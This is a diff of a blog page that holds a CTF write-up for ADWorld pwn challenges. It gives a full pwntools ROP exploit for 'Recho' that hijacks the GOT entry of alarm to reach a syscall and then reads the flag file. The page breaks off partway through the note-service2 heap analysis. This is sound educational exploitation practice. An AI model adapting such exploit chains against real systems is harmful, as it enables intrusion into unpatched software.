@@ -161,225 +161,273 @@
             <div class="main-content">
 
                 
-                    $avatarWidth = 46px;
-$arrow-icon-width = 16px;
-$post-nav-max-width = 220px;
-$article-title-font-size = 1.6rem;
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
 
-.article-content-container {
+        <div class="article-title">
+            <span class="title-hover-animation">ADWorld PWN Challenge Area Write-ups (GOT Hijacking)</span>
+        </div>
 
-  keep-container(false, 0, 0, 30px, 30px);
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/img/aliwangwang.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">TyeYeah</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2020-08-29 13:20:11</span>
+        <span class="mobile">2020-08-29 13:20</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/linux/">linux</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/stack-overflow/">stack-overflow</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ctf/">ctf</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/heap/">heap</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/uaf/">uaf</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/got/">got</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
 
-  .article-title {
-    color: var(--second-text-color);
-    font-weight: 600;
-    font-size: $article-title-font-size;
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.7k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>23 Mins</span>
+        </span>
+    
+    
+</div>
 
-    +keep-tablet() {
-      font-size: $article-title-font-size * 0.9;
-    }
+                    </div>
+                </div>
+            </div>
+        
 
-    +keep-mobile() {
-      font-size: $article-title-font-size * 0.8;
-    }
-  }
+        <div class="article-content markdown-body">
+            <p>Challenges here need to hijack <code>GOT</code>.</p>
+<h2 id="Recho"><a href="#Recho" class="headerlink" title="Recho"></a>Recho</h2><p>Attachment: <a href="/filehost/apcaw/recho">recho</a><br>Description: None</p>
+<p>A <code>ROP</code> challenge with <code>syscall</code> and other tricks.</p>
+<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file recho</span><br><span class="line">recho: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6696795a3d110750d6229d85238cad1a67892298, not stripped</span><br><span class="line">$ checksec recho</span><br><span class="line">[*] &#x27;/root/recho&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>Pseudocode:<br><code>main</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Init</span>(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Welcome to Recho server!\n&quot;</span>, <span class="number">0x19</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">read</span>(<span class="number">0</span>, &amp;nptr, <span class="number">0x10</span>uLL) &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="built_in">atoi</span>(&amp;nptr);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">15</span> )</span><br><span class="line">      v7 = <span class="number">16</span>;</span><br><span class="line">    v6 = <span class="built_in">read</span>(<span class="number">0</span>, buf, v7);</span><br><span class="line">    buf[v6] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Useful addresses:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># flag string</span><br><span class="line">.data:0000000000601058 flag            db &#x27;flag&#x27;,0</span><br><span class="line"># plt table</span><br><span class="line">.got.plt:0000000000601018 off_601018      dq offset write         ; DATA XREF: _write↑r</span><br><span class="line">.got.plt:0000000000601020 off_601020      dq offset printf        ; DATA XREF: _printf↑r</span><br><span class="line">.got.plt:0000000000601028 off_601028      dq offset alarm         ; DATA XREF: _alarm↑r</span><br><span class="line">.got.plt:0000000000601030 off_601030      dq offset read          ; DATA XREF: _read↑r</span><br><span class="line">.got.plt:0000000000601038 off_601038      dq offset setvbuf       ; DATA XREF: _setvbuf↑r</span><br><span class="line">.got.plt:0000000000601040 off_601040      dq offset atoi          ; DATA XREF: _atoi↑r</span><br></pre></td></tr></table></figure>
 
+<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>The biggest challenge is, there is an endless <code>while</code> loop receiving inputs all the time. though we have a chance to do stack overflow (it reads unlimited chars to <code>buf</code>, which is only <code>0x30</code> bytes away from <code>rbp</code>), we dont have a chance to get out of <code>while</code> loop to exit.</p>
+<p>Thankfully, in <code>pwntools</code> it has <code>shutdown</code> method to close the stream:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shutdown(self, direction)</span><br><span class="line"><span class="string">&quot;direction must be in [&#x27;in&#x27;, &#x27;out&#x27;, &#x27;read&#x27;, &#x27;recv&#x27;, &#x27;send&#x27;, &#x27;write&#x27;]&quot;</span></span><br></pre></td></tr></table></figure>
+<p>However after closing stream, there will be no further interaction, so no way to leak <code>libc</code> or so. But this program has no <code>system</code>, so we can only build a one-time <code>ROP</code> chain to read <code>flag</code> and output it.</p>
+<p>There is a tip for <code>alarm</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -q /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">pwndbg: loaded 177 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">Reading symbols from /usr/lib/x86_64-linux-gnu/libc.so.6...</span><br><span class="line">Reading symbols from /usr/lib/debug/.build-id/9c/9b4c997fbbff4ea98320bb8c286051f9ed6513.debug...</span><br><span class="line">pwndbg&gt; disassemble alarm</span><br><span class="line">Dump of assembler code for function alarm:</span><br><span class="line">   0x00000000000cb2d0 &lt;+0&gt;:     mov    eax,0x25</span><br><span class="line">   0x00000000000cb2d5 &lt;+5&gt;:     syscall</span><br><span class="line">   0x00000000000cb2d7 &lt;+7&gt;:     cmp    rax,0xfffffffffffff001</span><br><span class="line">   0x00000000000cb2dd &lt;+13&gt;:    jae    0xcb2e0 &lt;alarm+16&gt;</span><br><span class="line">   0x00000000000cb2df &lt;+15&gt;:    ret</span><br><span class="line">   0x00000000000cb2e0 &lt;+16&gt;:    mov    rcx,QWORD PTR [rip+0xf2b89]        # 0x1bde70</span><br><span class="line">   0x00000000000cb2e7 &lt;+23&gt;:    neg    eax</span><br><span class="line">   0x00000000000cb2e9 &lt;+25&gt;:    mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">   0x00000000000cb2ec &lt;+28&gt;:    or     rax,0xffffffffffffffff</span><br><span class="line">   0x00000000000cb2f0 &lt;+32&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<p>A <code>syscall</code> locates at the 5 offsets of the <code>alarm</code> start, we can use that by overwriting <code>alarm</code> in <code>GOT</code> as <code>syscall</code> (just add <code>0x5</code> to it is ok) and call it. It can be called <code>GOT</code> hijacking.<br>Search <code>add</code> gadgets:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary recho --only &quot;add|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004008af : add bl, dh ; ret</span><br><span class="line">0x00000000004008ad : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x00000000004008ab : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x00000000004008ac : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000400830 : add byte ptr [rax], al ; add cl, cl ; ret</span><br><span class="line">0x00000000004008ae : add byte ptr [rax], al ; ret</span><br><span class="line">0x00000000004006f8 : add byte ptr [rcx], al ; ret</span><br><span class="line">0x000000000040070d : add byte ptr [rdi], al ; ret</span><br><span class="line">0x0000000000400832 : add cl, cl ; ret</span><br><span class="line">0x00000000004006f4 : add eax, 0x20098e ; add ebx, esi ; ret</span><br><span class="line">0x000000000040070a : add eax, 0x70093eb ; ret</span><br><span class="line">0x00000000004006f9 : add ebx, esi ; ret</span><br><span class="line">0x00000000004005b3 : add esp, 8 ; ret</span><br><span class="line">0x00000000004005b2 : add rsp, 8 ; ret</span><br><span class="line">0x00000000004005b6 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 15</span><br></pre></td></tr></table></figure>
+<p>And search <code>pop</code> gadgets:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary recho --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040089e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008a0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008a2 : pop r15 ; ret</span><br><span class="line">0x00000000004006fc : pop rax ; ret</span><br><span class="line">0x000000000040089b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040089f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400690 : pop rbp ; ret</span><br><span class="line">0x00000000004008a3 : pop rdi ; ret</span><br><span class="line">0x00000000004006fe : pop rdx ; ret</span><br><span class="line">0x00000000004008a1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040089d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005b6 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 13</span><br></pre></td></tr></table></figure>
+<p>As for <code>system call</code> number you can check <code>/usr/include/asm/unistd_32.h</code> and <code>/usr/include/asm/unistd_64.h</code> for <code>32-bit</code> and <code>64-bit</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ more /usr/include/asm/unistd_64.h</span><br><span class="line">#ifndef _ASM_X86_UNISTD_64_H</span><br><span class="line">#define _ASM_X86_UNISTD_64_H 1</span><br><span class="line"></span><br><span class="line">#define __NR_read 0</span><br><span class="line">#define __NR_write 1</span><br><span class="line">#define __NR_open 2</span><br><span class="line">#define __NR_close 3</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>Considering flag{xxxxxx} is saved <code>flag</code> and we have a string <code>flag</code> in <code>.data</code>, we can <code>open</code> (<code>syscall</code> number 2) it to get content.</p>
+<p>So we build <code>ROP</code> chain to execute <code>fd=open(&#39;flag&#39;,READONLY)</code>, <code>read(fd,stdin_buffer,100)</code> and <code>write(1,bss,0x40)</code> one by one.</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>The script was written according to our exploit path: </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./recho&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">43839</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./recho&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x04008a3</span></span><br><span class="line">pop_rdx = <span class="number">0x04006fe</span></span><br><span class="line">pop_rax = <span class="number">0x04006fc</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x04008a1</span></span><br><span class="line">add_rax = <span class="number">0x04008ae</span></span><br><span class="line">add_rcx = <span class="number">0x04006f8</span></span><br><span class="line">add_rdi = <span class="number">0x040070d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite got</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>) + p64(pop_rax)+p64(<span class="number">5</span>)</span><br><span class="line">payload += p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;alarm&#x27;</span>])</span><br><span class="line">payload += p64(add_rdi)</span><br><span class="line"><span class="comment"># fd = open(&#x27;flag&#x27;, READONLY)</span></span><br><span class="line">payload += p64(pop_rdi)+p64(elf.sym[<span class="string">&#x27;flag&#x27;</span>]) <span class="comment"># rdi = flag</span></span><br><span class="line">payload += p64(pop_rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)   <span class="comment"># rsi = 0 (READONLY)</span></span><br><span class="line">payload += p64(pop_rax)+p64(<span class="number">2</span>)              <span class="comment"># rax = 2 (syscall number of open)</span></span><br><span class="line"><span class="comment"># syscall parameter passing order:rdi, rsi, rdx, r10, r9, r8</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;alarm&#x27;</span>])</span><br><span class="line"><span class="comment"># read(fd,stdin_buffer,100) , move flag content to .bss</span></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">3</span>) <span class="comment"># fd returned by open starts from 3</span></span><br><span class="line">payload += p64(pop_rsi_r15)+p64(elf.bss())+p64(<span class="number">0</span>) <span class="comment"># rsi = bss</span></span><br><span class="line">payload += p64(pop_rdx)+p64(<span class="number">100</span>) <span class="comment"># length</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"><span class="comment"># write(1,bss,0x40) , print flag</span></span><br><span class="line">payload += p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)+p64(elf.bss())+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx)+p64(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Welcome to Recho server!\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(<span class="number">0x200</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.shutdown(<span class="string">&#x27;send&#x27;</span>) <span class="comment"># or: in, out, recv, read, write</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-  .article-header {
-    position: relative;
-    padding-left: $avatarWidth;
-    width: 100%;
-    height: $avatarWidth;
-    box-sizing: border-box;
+<h2 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h2><p>Attachment: <a href="/filehost/apcaw/note-service2">note-service2</a><br>Description: None</p>
+<p>A heap challenge with array out of bounds.</p>
+<h3 id="Information-1"><a href="#Information-1" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file note-service2</span><br><span class="line">note-service2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6c3a706907441fd73514dbca2d692e7a7c9139aa, stripped</span><br><span class="line">$ checksec note-service2</span><br><span class="line">[*] &#x27;/root/note-service2&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<p>Pseudocode:<br><code>main</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">initial</span>();</span><br><span class="line">  <span class="built_in">banner</span>();</span><br><span class="line">  <span class="built_in">entry</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>entry</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">entry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your choice&gt;&gt; &quot;</span>);</span><br><span class="line">    <span class="built_in">read_num</span>();</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        <span class="built_in">add</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="built_in">show</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        <span class="built_in">edit</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="built_in">del</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>read_num</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_num</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">read_num_sub</span>((__int64)&amp;nptr, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">atoi</span>(&amp;nptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>add</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = dword_20209C;</span><br><span class="line">  <span class="keyword">if</span> ( dword_20209C &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = dword_20209C;</span><br><span class="line">    <span class="keyword">if</span> ( dword_20209C &lt;= <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">      v1 = <span class="built_in">read_num</span>();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">      result = <span class="built_in">read_num</span>();</span><br><span class="line">      v2 = result;</span><br><span class="line">      <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qword_2020A0[v1] = <span class="built_in">malloc</span>(result);</span><br><span class="line">        <span class="keyword">if</span> ( !qword_2020A0[v1] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;malloc error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">        <span class="built_in">read_num_sub</span>(qword_2020A0[v1], v2);</span><br><span class="line">        result = dword_20209C++ + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>del</code>:</p>
